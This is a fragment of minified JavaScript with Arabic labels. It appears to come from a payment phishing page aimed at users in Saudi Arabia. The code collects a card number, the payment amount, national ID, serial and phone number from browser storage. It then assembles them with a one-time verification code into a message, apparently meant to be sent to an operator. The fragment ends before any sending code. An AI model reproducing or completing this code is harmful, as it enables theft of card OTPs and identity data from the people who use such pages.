...
const finalAmount=localStorage.getItem("finalAmount")||localStorage.getItem("selectedPrice")||"غير متوفر";const cardNumber=localStorage.getItem("cardNumber")||"0000";const last4=cardNumber.slice(-4);const formData=JSON.parse(localStorage.getItem("formData")||"{}");const identity=formData.id||"غير محدد";const serial=formData.serial||"غير محدد";const phone=formData.phone||"غير محدد";const message=`
رمز التحقق:

🔚 آخر ٤ أرقام من البطاقة: ${last4}
💵 المبلغ: ${finalAmount} SAR
🔐 رمز التحقق: ${otpValue}
